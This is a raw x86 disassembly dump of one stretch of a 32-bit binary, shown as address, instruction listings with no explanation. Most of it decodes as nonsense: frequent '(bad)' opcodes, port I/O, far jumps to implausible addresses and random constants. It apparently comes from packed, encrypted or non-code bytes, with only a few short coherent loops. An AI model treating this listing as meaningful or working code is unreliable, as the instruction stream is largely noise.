  4018ce:	test   DWORD PTR [edx-0x17],esi
  4018d1:	inc    eax
  4018d2:	xchg   DWORD PTR [edx],esp
  4018d4:	mov    al,ds:0x343d2a85
  4018d9:	addr16 xchg edi,eax
  4018db:	push   0xfffffff3
  4018dd:	clc    
  4018de:	imul   BYTE PTR ds:0x57e5a5bc
  4018e4:	and    ebp,edi
  4018e6:	std    
  4018e7:	and    al,0xb4
  4018e9:	and    eax,0x1f9c05ca
  4018ee:	push   esp
  4018ef:	xchg   DWORD PTR [ecx+ebx*1-0x33],edi
  4018f3:	push   ebp
  4018f4:	mov    eax,0x2dcc37c1
  4018f9:	dec    edi
  4018fa:	ins    DWORD PTR es:[edi],dx
  4018fb:	in     eax,dx
  4018fc:	xchg   edi,eax
  4018fd:	test   al,0xc5
  4018ff:	add    dl,dh
  401901:	jge    0x401943
  401903:	rcr    BYTE PTR [ebx-0x1acfde65],cl
  401909:	imul   esi,ebp,0x5539420d
  40190f:	pushf  
  401910:	mov    bh,0x87
  401912:	out    0x72,eax
  401914:	data16 js 0x4018a8
  401917:	pop    eax
  401918:	sub    BYTE PTR [esi],bl
  40191a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40191b:	and    eax,0x8b69af72
  401920:	push   es
  401921:	jg     0x401948
  401923:	loop   0x401959
  401925:	sbb    ah,BYTE PTR [esi-0x7ca5daea]
  40192b:	pop    ebp
  40192c:	enter  0x9e0c,0x3f
  401930:	adc    eax,0xc240fdfd
  401935:	adc    esi,DWORD PTR [ecx]
  401937:	push   eax
  401938:	push   eax
  401939:	(bad)  
  40193b:	data16 jecxz 0x401908
  40193e:	mov    eax,DWORD PTR [edx+edi*4+0x69281281]
  401945:	jnp    0x401986
  401947:	add    al,BYTE PTR [esi+ebp*1]
  40194a:	xchg   ebx,eax
  40194b:	mov    ch,0x9a
  40194d:	xor    DWORD PTR [ebp-0x58dd7a00],ebp
  401953:	ds jns 0x4019a6
  401956:	pop    edx
  401957:	sub    BYTE PTR [eax-0x2b],ah
  40195a:	jnp    0x4019ae
  40195c:	lea    esp,[edx+0x26]
  40195f:	mov    WORD PTR [eax],fs
  401961:	inc    ebp
  401962:	and    eax,0x5f66a157
  401967:	mov    dl,0x37
  401969:	dec    ecx
  40196a:	gs xchg dl,cl
  40196d:	scas   al,BYTE PTR es:[edi]
  40196e:	xor    eax,DWORD PTR [ebp-0x263ecf50]
  401974:	adc    al,0x90
  401976:	xchg   esi,eax
  401977:	cld    
  401978:	jge    0x401992
  40197a:	xchg   BYTE PTR [edi+0x3b],ah
  40197d:	push   ebp
  40197e:	xor    eax,0x9ddadb61
  401983:	dec    edi
  401984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401985:	xor    eax,0x412f409d
  40198a:	outs   dx,DWORD PTR ds:[esi]
  40198b:	adc    BYTE PTR [eax+0xc37bc69],bl
  401991:	neg    BYTE PTR [esi-0x23b8db61]
  401997:	shl    DWORD PTR [eax],1
  401999:	or     eax,0x7a24f6bf
  40199e:	mov    ah,0xa8
  4019a0:	rcr    DWORD PTR [ecx+edi*2+0x68129002],cl
  4019a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019a8:	mov    BYTE PTR [ebp+0x3f],bl
  4019ab:	(bad)  
  4019ad:	inc    ecx
  4019ae:	xchg   ebx,eax
  4019af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019b0:	mov    esp,0xa2c5fb5b
  4019b5:	push   0x81507a0a
  4019ba:	(bad)  
  4019bb:	mov    ebp,0xf81a0d92
  4019c0:	stos   BYTE PTR es:[edi],al
  4019c1:	xchg   ebx,eax
  4019c2:	pop    ebp
  4019c3:	daa    
  4019c4:	test   eax,esi
  4019c6:	xchg   ecx,eax
  4019c7:	and    eax,0x8f1fed9b
  4019cc:	and    edi,esi
  4019ce:	push   edx
  4019cf:	xor    ecx,DWORD PTR [ebp-0xf57a6c8]
  4019d5:	lds    ecx,FWORD PTR [ebx-0xbd976ec]
  4019db:	sub    DWORD PTR [esi],edi
  4019dd:	push   es
  4019de:	(bad)  
  4019df:	aam    0x24
  4019e1:	or     DWORD PTR [ecx+0x28],0x4
  4019e5:	dec    edx
  4019e6:	dec    edx
  4019e7:	leave  
  4019e8:	mov    ecx,DWORD PTR [edx+esi*4-0x6d]
  4019ec:	xchg   edi,eax
  4019ed:	aam    0x6f
  4019ef:	jb     0x4019eb
  4019f1:	lods   eax,DWORD PTR ds:[esi]
  4019f2:	mov    edi,0xb227db75
  4019f7:	sub    DWORD PTR [eax],ebp
  4019f9:	repnz in eax,0xa8
  4019fc:	sub    al,0xdc
  4019fe:	dec    ebp
  4019ff:	lods   eax,DWORD PTR ds:[esi]
  401a00:	pop    ds
  401a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a02:	pop    edx
  401a03:	or     DWORD PTR [edi+0x26],esi
  401a06:	test   eax,0x4ba55aeb
  401a0b:	pop    eax
  401a0c:	lods   al,BYTE PTR ds:[esi]
  401a0d:	mov    bh,0xda
  401a0f:	in     eax,0x35
  401a11:	pushf  
  401a12:	and    eax,0x5b02085e
  401a17:	out    0x4c,al
  401a19:	and    ebp,DWORD PTR [ebx-0x230cf9ef]
  401a1f:	daa    
  401a20:	mov    ecx,0x4a003620
  401a25:	leave  
  401a26:	or     edi,DWORD PTR [edx+0xa9ff050]
  401a2c:	pusha  
  401a2d:	out    0xab,al
  401a2f:	dec    edi
  401a30:	nop
  401a31:	push   ss
  401a32:	(bad)  
  401a33:	pop    ebp
  401a34:	and    DWORD PTR [eax+0x7e],edi
  401a37:	setne  BYTE PTR [edi+0x100b13ed]
  401a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a3f:	cmc    
  401a40:	push   ecx
  401a41:	adc    al,0xf7
  401a43:	icebp  
  401a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a45:	(bad)  
  401a46:	retf   0x6a1c
  401a49:	sub    BYTE PTR [esi+ebx*4-0x56],ah
  401a4d:	inc    esi
  401a4e:	add    eax,0xe353842b
  401a53:	push   eax
  401a54:	sbb    al,0xb0
  401a56:	gs push 0x49ca45f3
  401a5c:	inc    eax
  401a5d:	dec    esi
  401a5e:	mov    bl,0xc5
  401a60:	xor    BYTE PTR [ebx-0x75],al
  401a63:	inc    ebp
  401a64:	or     BYTE PTR [ecx+0x43454f25],al
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	add    BYTE PTR [eax],al
  401a6e:	add    BYTE PTR [ebx+0x43454f0d],cl
  401a74:	add    BYTE PTR [ecx-0x77],al
  401a77:	or     eax,0x43454f
  401a7c:	cmp    DWORD PTR ds:0x43454f,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x43454f,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x43454f
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x43454f,ecx
  401aae:	cmp    DWORD PTR ds:0x43454f,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x80bc485e
  401ae8:	lea    esp,[ecx+0x7e7e0452]
  401aee:	mov    ch,0x7f
  401af0:	jle    0x401b70
  401af2:	cmp    eax,0xbfa89a0c
  401af7:	fld    DWORD PTR [ebx]
  401af9:	inc    ebp
  401afa:	shl    DWORD PTR [esi],0xff
  401afd:	sar    BYTE PTR ds:0xeaaec09e,cl
  401b03:	or     DWORD PTR [edx-0x3fc2925a],esp
  401b09:	inc    eax
  401b0a:	cmp    ecx,DWORD PTR [ecx]
  401b0c:	add    DWORD PTR [esi-0x36],ebx
  401b0f:	cmp    al,0x99
  401b11:	jns    0x401b54
  401b13:	hlt    
  401b14:	call   0x3e9edd2d
  401b19:	lods   al,BYTE PTR ds:[esi]
  401b1a:	dec    ebx
  401b1b:	sub    al,0xc6
  401b1d:	sbb    BYTE PTR [esi],ch
  401b1f:	lahf   
  401b20:	call   FWORD PTR [ecx+0x26]
  401b23:	mov    DWORD PTR [ebp+0x24710339],0x4501ae3
  401b2d:	add    al,0xaa
  401b2f:	neg    DWORD PTR [ecx+edi*8]
  401b32:	and    ecx,edi
  401b34:	sbb    BYTE PTR [esi-0x65f4abe2],0xb8
  401b3b:	xchg   DWORD PTR [esi+0x2d7e20aa],eax
  401b41:	je     0x401b1f
  401b43:	push   cs
  401b44:	mov    bh,0xf7
  401b46:	out    0x81,al
  401b48:	icebp  
  401b49:	div    BYTE PTR [ecx-0x5cb08874]
  401b4f:	xchg   BYTE PTR [eax],dh
  401b51:	test   al,0x34
  401b53:	int3   
  401b54:	in     al,dx
  401b55:	sub    ebx,DWORD PTR [edi-0x24]
  401b58:	jb     0x401b54
  401b5a:	inc    esp
  401b5b:	inc    edx
  401b5c:	shl    BYTE PTR [esi],cl
  401b5e:	mov    WORD PTR [ecx-0x77],ss
  401b61:	in     al,0xdc
  401b63:	xlat   BYTE PTR ds:[ebx]
  401b64:	daa    
  401b65:	call   0xe5a446d5
  401b6a:	fnstcw WORD PTR [edi+0x6243257]
  401b70:	retf   0x171
  401b73:	xor    eax,0x471704b3
  401b78:	enter  0x3d98,0xde
  401b7c:	(bad)  
  401b7d:	sub    DWORD PTR [edi],eax
  401b7f:	out    dx,eax
  401b80:	popf   
  401b81:	and    ecx,DWORD PTR [esi]
  401b83:	pop    ecx
  401b84:	loop   0x401bdb
  401b86:	loopne 0x401be3
  401b88:	inc    edi
  401b89:	mov    esi,DWORD PTR [esp+esi*4]
  401b8c:	pop    eax
  401b8d:	imul   esp,DWORD PTR [edx-0x3c35b22d],0x1
  401b94:	pop    ebx
  401b95:	cmp    ebx,DWORD PTR [esi-0x38]
  401b98:	fwait
  401b99:	sbb    esp,ebx
  401b9b:	sub    eax,DWORD PTR [eax+eiz*4-0x2d]
  401b9f:	jb     0x401c0a
  401ba1:	push   cs
  401ba2:	js     0x401c14
  401ba4:	sbb    edi,DWORD PTR [ebx+0x22]
  401ba7:	jl     0x401b92
  401ba9:	mov    ebp,0x98718d96
  401bae:	cmp    al,0xe8
  401bb0:	pusha  
  401bb1:	imul   DWORD PTR [ebx-0x21d61a46]
  401bb7:	add    BYTE PTR [esi+0x32f32d],dh
  401bbd:	xchg   ecx,eax
  401bbe:	icebp  
  401bbf:	ss dec esi
  401bc1:	cmp    eax,0x9600b4ba
  401bc6:	das    
  401bc7:	push   eax
  401bc8:	jp     0x401bd0
  401bca:	or     al,0x70
  401bcc:	lock lods al,BYTE PTR ds:[esi]
  401bce:	daa    
  401bcf:	sbb    dl,BYTE PTR [ecx+esi*2]
  401bd2:	adc    al,dl
  401bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bd5:	(bad)  
  401bd6:	aam    0x1e
  401bd8:	(bad)  
  401bd9:	xchg   edx,eax
  401bda:	and    bl,BYTE PTR [ebx]
  401bdc:	jbe    0x401bc1
  401bde:	ins    DWORD PTR es:[edi],dx
  401bdf:	in     al,dx
  401be0:	or     esp,DWORD PTR [ebx+edi*2+0x143d303d]
  401be7:	outs   dx,DWORD PTR ds:[esi]
  401be8:	add    al,0x4
  401bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401beb:	push   ecx
  401bec:	(bad)  [eax+0x1e]
  401bef:	cmp    DWORD PTR [ebx-0x5e],0xfe4eaa94
  401bf6:	mov    eax,ds:0x971b24ee
  401bfb:	xor    esp,DWORD PTR [edi-0x124a63f9]
  401c01:	pop    ebx
  401c02:	retf   0x11e4
  401c05:	jmp    0x485deaa0
  401c0a:	cwde   
  401c0b:	(bad)  
  401c0c:	clc    
  401c0d:	nop
  401c0e:	test   bh,0xf7
  401c11:	in     eax,dx
  401c12:	adc    al,0xb5
  401c14:	mov    fs,esi
  401c16:	jmp    0x49bf:0xda668133
  401c1d:	mov    WORD PTR [edi-0x2e],gs
  401c20:	(bad)  
  401c21:	call   0xbf1ad1df
  401c26:	ror    BYTE PTR [edx],0x2
  401c29:	mov    edi,0x33e13366
  401c2e:	push   ss
  401c2f:	push   cs
  401c30:	mov    dh,BYTE PTR [esi-0x51]
  401c33:	mov    ebp,0xf177b7d8
  401c38:	jp     0x401bd2
  401c3a:	ins    BYTE PTR es:[edi],dx
  401c3b:	jns    0x401c7c
  401c3d:	mov    ecx,0x6ecf1a1f
  401c42:	pop    ss
  401c43:	sar    esp,cl
  401c45:	sti    
  401c46:	sahf   
  401c47:	ss rcr ecx,0x29
  401c4b:	mov    al,ds:0x67373feb
  401c50:	cmp    DWORD PTR [edx-0xe18f12c],eax
  401c56:	daa    
  401c57:	xchg   edx,eax
  401c58:	(bad)  
  401c59:	in     eax,dx
  401c5a:	leave  
  401c5b:	adc    eax,0xc7b07430
  401c60:	ror    edx,cl
  401c62:	popf   
  401c63:	add    dh,BYTE PTR [bp+di-0x53]
  401c67:	jge    0x401c60
  401c69:	in     al,dx
  401c6a:	push   ds
  401c6b:	add    ch,bl
  401c6d:	lods   al,BYTE PTR ds:[esi]
  401c6e:	nop
  401c6f:	push   edi
  401c70:	adc    DWORD PTR [ecx+0x8ebdb3e],edx
  401c76:	pop    esp
  401c77:	jmp    0x9dae:0xe847b29b
  401c7e:	cmp    BYTE PTR [eax],bh
  401c80:	dec    edi
  401c81:	mov    ch,0x73
  401c83:	sbb    eax,0xad274c81
  401c88:	adc    edx,DWORD PTR [eax]
  401c8a:	out    0xc6,al
  401c8c:	cli    
  401c8d:	jge    0x401c36
  401c8f:	outs   dx,BYTE PTR ds:[esi]
  401c90:	push   0x3d
  401c92:	stos   BYTE PTR es:[edi],al
  401c93:	int3   
  401c94:	das    
  401c95:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  401c97:	xchg   edx,eax
  401c98:	test   eax,0x2dad6a32
  401c9d:	sub    esp,DWORD PTR [ebx+0x4c]
  401ca0:	inc    ebx
  401ca1:	or     eax,0x6f31da21
  401ca6:	jmp    0x414b:0xd2a199d1
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	mov    dh,0x2c
  401ccc:	pop    esp
  401ccd:	push   edx
  401cce:	mov    DWORD PTR [esi],eax
  401cd0:	jle    0x401d50
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	pop    ds
  401cd7:	mov    ds:0x28ee36b1,al
  401cdc:	jne    0x401c88
  401cde:	(bad)  
  401cdf:	push   0xfffffff6
  401ce1:	arpl   dx,sp
  401ce3:	cld    
  401ce4:	jae    0x401d5c
  401ce6:	mov    ds:0x9d8059c3,eax
  401ceb:	xlat   BYTE PTR ds:[ebx]
  401cec:	xor    cl,BYTE PTR [ebx]
  401cee:	jne    0x401d18
  401cf0:	aas    
  401cf1:	stc    
  401cf2:	das    
  401cf3:	push   es
  401cf4:	test   DWORD PTR [ebx],esi
  401cf6:	mov    DWORD PTR [esi-0x587af8c0],edi
  401cfc:	out    0xe3,al
  401cfe:	sbb    eax,0x7d303ba8
  401d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d04:	popa   
  401d05:	mov    al,ds:0xc78a0acf
  401d0a:	cmovs  ebp,DWORD PTR [eax]
  401d0d:	aad    0x6d
  401d0f:	sub    esi,DWORD PTR [edi-0x6a]
  401d12:	dec    edi
  401d13:	dec    ebx
  401d14:	mov    WORD PTR ds:[ebp+ebx*4+0x55],?
  401d19:	hlt    
  401d1a:	or     DWORD PTR [edx+0x16],edx
  401d1d:	imul   ebx,ebp,0xffffff82
  401d20:	sbb    bl,BYTE PTR ds:0xedc4f4d8
  401d26:	jmp    0xaa6d:0x835479ef
  401d2d:	clc    
  401d2e:	outs   dx,BYTE PTR ds:[esi]
  401d2f:	dec    edx
  401d30:	bound  esi,QWORD PTR [eax-0x2]
  401d33:	inc    ebp
  401d34:	pop    ds
  401d35:	mov    ah,0x16
  401d37:	or     al,0x5f
  401d39:	xchg   edx,eax
  401d3a:	cdq    
  401d3b:	pop    edi
  401d3c:	xchg   ecx,eax
  401d3d:	aam    0x87
  401d3f:	scas   eax,DWORD PTR es:[edi]
  401d40:	cld    
  401d41:	fs mov al,0x4c
  401d44:	out    0x0,al
  401d46:	or     ecx,edi
  401d48:	adc    dl,ah
  401d4a:	test   DWORD PTR [edi+0x3b],ecx
  401d4d:	cmp    BYTE PTR [eax],0x90
  401d50:	xchg   ebx,eax
  401d51:	xchg   ecx,eax
  401d52:	jo     0x401d42
  401d54:	jns    0x401dc1
  401d56:	or     edi,DWORD PTR [ecx]
  401d58:	lds    ebp,FWORD PTR [eax]
  401d5a:	gs dec ebp
  401d5c:	stos   DWORD PTR es:[edi],eax
  401d5d:	push   edx
  401d5e:	lds    eax,FWORD PTR [ecx+0x64]
  401d61:	add    eax,0x312947f6
  401d66:	addr16 mov dh,0xff
  401d69:	fucomp st(4)
  401d6b:	popf   
  401d6c:	int    0x49
  401d6e:	or     DWORD PTR [ecx+eax*8],edx
  401d71:	xor    ecx,edx
  401d73:	xchg   ebp,eax
  401d74:	mov    edx,0x8d3d31a6
  401d79:	adc    DWORD PTR [edx+0x69],ebp
  401d7c:	mov    esp,0x94cb3e45
  401d81:	add    esi,DWORD PTR [esi+0x41852e95]
  401d87:	inc    ecx
  401d88:	cmp    BYTE PTR [eax+esi*8+0x40cf17],ch
  401d8f:	rol    BYTE PTR [eax-0x554ece7c],1
  401d95:	and    DWORD PTR ds:0xbdeb3694,esp
  401d9b:	test   eax,0x46881e41
  401da0:	leave  
  401da1:	xchg   esp,eax
  401da2:	loope  0x401de0
  401da4:	fstp   QWORD PTR [eax]
  401da6:	pop    ss
  401da7:	mov    eax,0x1e5f6d9b
  401dac:	mov    cl,0x14
  401dae:	xlat   BYTE PTR gs:[ebx]
  401db0:	xor    BYTE PTR [esi-0x2a759185],ah
  401db6:	or     al,0xd8
  401db8:	add    cl,BYTE PTR [edi+edi*4]
  401dbb:	mov    ah,0xb3
  401dbd:	ds pop ds
  401dbf:	(bad)  
  401dc0:	xor    BYTE PTR [esi-0x6],bl
  401dc3:	xor    al,BYTE PTR [edx+0x5e]
  401dc6:	mov    cl,0x55
  401dc8:	imul   ecx,DWORD PTR [edi+0x63],0x1bfa18f8
  401dcf:	or     ah,cl
  401dd1:	fdiv   DWORD PTR [edx-0x10]
  401dd4:	mov    BYTE PTR [ebx+0x418fa121],ah
  401dda:	dec    esi
  401ddb:	add    DWORD PTR [edi],0x42134a8
  401de1:	push   0xffffffe9
  401de3:	xchg   DWORD PTR [ebx+0x1b],ebp
  401de6:	cmp    eax,DWORD PTR [ecx+0x7c]
  401de9:	xchg   ecx,eax
  401dea:	mov    BYTE PTR [eax],bh
  401dec:	push   ss
  401ded:	jb     0x401df2
  401def:	imul   esp,DWORD PTR [ebx],0xffffff91
  401df2:	xchg   ebp,eax
  401df3:	mov    DWORD PTR [esi],esi
  401df5:	aam    0xe2
  401df7:	mov    bl,0xac
  401df9:	mov    ecx,0xcb78b19f
  401dfe:	xor    al,0x41
  401e00:	dec    ebx
  401e01:	cld    
  401e02:	das    
  401e03:	test   BYTE PTR [edx],ch
  401e05:	jae    0x401e6b
  401e07:	push   es
  401e08:	or     BYTE PTR [edi-0x13b1bf43],0x51
  401e0f:	pop    eax
  401e10:	and    esp,DWORD PTR [edx-0x741d71e4]
  401e16:	call   DWORD PTR [ecx-0x8]
  401e19:	dec    eax
  401e1a:	sbb    dh,al
  401e1c:	push   esi
  401e1d:	push   ds
  401e1e:	jns    0x401e5b
  401e20:	(bad)  
  401e21:	cmc    
  401e22:	xor    ebp,ecx
  401e24:	jle    0x401e9a
  401e26:	out    dx,eax
  401e27:	add    DWORD PTR ds:0xa3dd0927,edi
  401e2d:	push   edi
  401e2e:	push   ds
  401e2f:	pop    ss
  401e30:	nop
  401e31:	mov    ecx,0xaedff333
  401e36:	xlat   BYTE PTR ds:[ebx]
  401e37:	sbb    eax,0xe80b0ddc
  401e3c:	in     eax,dx
  401e3d:	stc    
  401e3e:	pop    ebx
  401e3f:	(bad)  
  401e40:	pop    ds
  401e41:	mov    al,0x54
  401e43:	jp     0x401dca
  401e45:	xchg   esp,eax
  401e46:	mov    al,ds:0x2492ec19
  401e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e4c:	jne    0x401e3a
  401e4e:	(bad)  
  401e4f:	xor    dl,BYTE PTR [esi-0x606b8686]
  401e55:	xchg   esp,eax
  401e56:	repnz pop ebx
  401e58:	push   ds
  401e59:	aaa    
  401e5a:	jl     0x401ec9
  401e5c:	mov    dl,0x38
  401e5e:	fisttp DWORD PTR [esp+edx*2-0x2202becd]
  401e65:	fisub  WORD PTR [esi]
  401e67:	je     0x401e7b
  401e69:	aam    0xec
  401e6b:	jnp    0x401e48
  401e6d:	add    esi,edi
  401e6f:	adc    DWORD PTR [edx+0x41529f4d],ebx
  401e75:	out    dx,eax
  401e76:	mov    cl,0x97
  401e78:	add    cl,0x4f
  401e7b:	add    DWORD PTR [edi],esp
  401e7d:	(bad)  
  401e7f:	loope  0x401ea8
  401e81:	cwde   
  401e82:	pop    edi
  401e83:	(bad)  
  401e84:	push   ebx
  401e85:	dec    ebx
  401e86:	push   esp
  401e87:	and    ebp,esi
  401e89:	mov    WORD PTR ds:0x4d89af19,ss
  401e8f:	call   0x8b4c641f
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	cs icebp 
  401eb1:	xor    ecx,DWORD PTR [edx]
  401eb3:	rol    BYTE PTR [eax],0x7e
  401eb6:	jle    0x401e6d
  401eb8:	jg     0x401f38
  401eba:	jle    0x401ecc
  401ebc:	out    dx,eax
  401ebd:	dec    ebx
  401ebe:	test   al,0x8b
  401ec0:	adc    BYTE PTR [edx],0xa1
  401ec3:	push   eax
  401ec4:	stos   BYTE PTR es:[edi],al
  401ec5:	cmp    edi,DWORD PTR [esi-0x3e]
  401ec8:	add    DWORD PTR [ebx+eax*8],0xffffffd6
  401ecc:	int3   
  401ecd:	ret    0x4b18
  401ed0:	ss gs push esi
  401ed3:	adc    BYTE PTR [esi-0x63fe368a],0x8a
  401eda:	lods   al,BYTE PTR ds:[esi]
  401edb:	mov    cl,0xb
  401edd:	das    
  401ede:	jp     0x401ec8
  401ee0:	push   esi
  401ee1:	idiv   BYTE PTR [edx-0x2f]
  401ee4:	out    0xba,eax
  401ee6:	jl     0x401e83
  401ee8:	iret   
  401ee9:	repz add dl,BYTE PTR [eax-0x2f]
  401eed:	cli    
  401eee:	push   0xffffffd8
  401ef0:	jp     0x401efd
  401ef2:	lea    edx,[edx+0x6e]
  401ef5:	jl     0x401f38
  401ef7:	dec    DWORD PTR [edi]
  401ef9:	push   ds
  401efa:	jge    0x401ef6
  401efc:	aaa    
  401efd:	cwde   
  401efe:	pushf  
  401eff:	mov    esp,0xd768b01b
  401f04:	mov    ecx,0x53781a59
  401f09:	imul   edi,DWORD PTR [ebx+0x1ca9f380],0x40f873e4
  401f13:	mov    ch,0x31
  401f15:	fisttp QWORD PTR [edx]
  401f17:	xchg   ebx,eax
  401f18:	jp     0x401f75
  401f1a:	stc    
  401f1b:	xor    al,BYTE PTR [ebx+0x39]
  401f1e:	push   0xc087a0dd
  401f23:	push   ecx
  401f24:	sbb    DWORD PTR [edi+eiz*1],edx
  401f27:	xor    eax,0xbd1a6b23
  401f2c:	out    0x22,al
  401f2e:	pop    edi
  401f2f:	ret    
  401f30:	jne    0x401ebd
  401f32:	das    
  401f33:	dec    esp
  401f34:	add    ecx,eax
  401f36:	mov    DWORD PTR [esi+0x7a4fc982],ebx
  401f3c:	adc    edi,DWORD PTR [ebp+eiz*2+0x5a]
  401f40:	jmp    0x5f3e:0x17f6b848
  401f47:	mov    dl,0x91
  401f49:	mov    dl,0x8d
  401f4b:	ficomp DWORD PTR [esi-0x3839104c]
  401f51:	pusha  
  401f52:	mov    cl,0xa
  401f54:	gs inc ebx
  401f56:	push   ebp
  401f57:	xchg   ecx,eax
  401f58:	sub    cl,ch
  401f5a:	imul   esp,DWORD PTR gs:[ecx+0x4e],0x40
  401f5f:	sub    DWORD PTR [ebx-0x18],ebp
  401f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f63:	sub    bh,BYTE PTR ds:0x3f0a70f5
  401f69:	xchg   edx,eax
  401f6a:	jae    0x401f34
  401f6c:	pop    esi
  401f6d:	dec    ebx
  401f6e:	cmp    bp,WORD PTR [ecx+ebp*8+0x0]
  401f73:	stos   DWORD PTR es:[edi],eax
  401f74:	dec    edx
  401f75:	lods   al,BYTE PTR ds:[esi]
  401f76:	mov    dh,0xbb
  401f78:	test   al,0xc0
  401f7a:	pop    es
  401f7b:	frstor [esi]
  401f7d:	addr16 push edx
  401f7f:	or     al,0x9c
  401f81:	js     0x401fcf
  401f83:	(bad)  
  401f84:	ror    DWORD PTR [edx],0x39
  401f87:	gs and eax,0xef147112
  401f8d:	scas   al,BYTE PTR es:[edi]
  401f8e:	(bad)  
  401f8f:	xor    eax,0xd6a174be
  401f94:	jle    0x401fe3
  401f96:	jle    0x401f8a
  401f98:	scas   al,BYTE PTR es:[edi]
  401f99:	mov    bl,0xa5
  401f9b:	popa   
  401f9c:	push   esp
  401f9d:	adc    dl,BYTE PTR [ebp+0x4e]
  401fa0:	mov    esi,0x7487bdfb
  401fa5:	frstor [ebx+0x5a]
  401fa8:	test   eax,0xdc89b8de
  401fad:	mov    esp,0x6400bbb8
  401fb2:	or     BYTE PTR [esi],dl
  401fb4:	push   esi
  401fb5:	inc    edi
  401fb6:	mov    ebx,0xe385b79d
  401fbb:	mov    esp,DWORD PTR [edi]
  401fbd:	sbb    DWORD PTR [edx+0x6c97c4a3],eax
  401fc3:	int    0xdf
  401fc5:	mov    ebp,0x10569256
  401fca:	adc    eax,0xb1f2b72b
  401fcf:	or     al,0x21
  401fd1:	test   eax,0x3ea5aebf
  401fd6:	inc    esp
  401fd7:	mov    al,ds:0xd6613703
  401fdc:	out    dx,al
  401fdd:	pushf  
  401fde:	xchg   edi,eax
  401fdf:	mov    ebx,0xd2e75c0a
  401fe4:	jo     0x401f9d
  401fe6:	loop   0x40200c
  401fe8:	scas   eax,DWORD PTR es:[edi]
  401fe9:	jmp    0xc9f98bb0
  401fee:	pop    esi
  401fef:	or     edx,ecx
  401ff1:	repnz and eax,0xd746bf3f
  401ff7:	ins    DWORD PTR es:[edi],dx
  401ff8:	pop    eax
  401ff9:	xor    ebp,DWORD PTR [esp+ebx*8+0x8bfa4bd]
  402000:	cmp    ebp,DWORD PTR [edi+0x44dc54eb]
  402006:	cmc    
  402007:	dec    edx
  402008:	cmc    
  402009:	jnp    0x40206c
  40200b:	xchg   esp,eax
  40200c:	lds    eax,FWORD PTR [esi]
  40200e:	xchg   esi,eax
  40200f:	popf   
  402010:	(bad)  
  402011:	in     al,0xba
  402013:	enter  0xf294,0x76
  402017:	jno    0x40202d
  402019:	popa   
  40201a:	add    eax,DWORD PTR [esi+eax*1+0x73248449]
  402021:	test   BYTE PTR [ebx],bl
  402023:	les    ebx,FWORD PTR [edi-0x5b]
  402026:	lock inc ebp
  402028:	cmp    DWORD PTR [ecx],eax
  40202a:	rol    DWORD PTR [ebx+0x2f],0xdd
  40202e:	ficomp WORD PTR [edi]
  402030:	imul   esi,DWORD PTR [edx-0x712fdbc8],0x5fd13c6d
  40203a:	add    esi,DWORD PTR [ecx-0x1a]
  40203d:	jo     0x402041
  40203f:	fldcw  WORD PTR [edi]
  402041:	aam    0xfd
  402043:	pop    edx
  402044:	push   cs
  402045:	fld    DWORD PTR [ebx]
  402047:	pushf  
  402048:	mov    ds:0xa37bb92c,al
  40204d:	mov    ebp,0x2bda6e9f
  402052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402053:	xor    BYTE PTR [ebp+eiz*4+0x714d382a],dh
  40205a:	sbb    ebx,ecx
  40205c:	sar    ecx,0x4a
  40205f:	repz into 
  402061:	(bad)  
  402063:	sub    al,0x94
  402065:	in     al,dx
  402066:	adc    esi,esi
  402068:	clc    
  402069:	sbb    al,0x95
  40206b:	data16 sub al,0x89
  40206e:	hlt    
  40206f:	dec    esp
  402070:	adc    DWORD PTR [edx-0x3ba749a],edi
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
